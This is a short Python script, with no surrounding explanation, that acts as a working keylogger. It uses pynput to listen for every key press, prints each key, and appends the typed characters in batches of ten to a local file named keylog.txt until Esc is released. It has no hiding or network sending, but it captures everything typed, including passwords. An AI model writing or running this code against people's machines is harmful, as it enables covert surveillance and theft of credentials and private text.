import pynput

from pynput.keyboard import Key, Listener

i = 0
temp_log = []


def key_press(usr_input):
    global temp_log, i

    temp_log.append(usr_input)
    i += 1
    print("{0} pressed".format(usr_input))

    if i >= 10:
        i = 0
        log_of_keys(temp_log)
        temp_log = []


def log_of_keys(keys):
    with open("keylog.txt", 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)


def key_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()



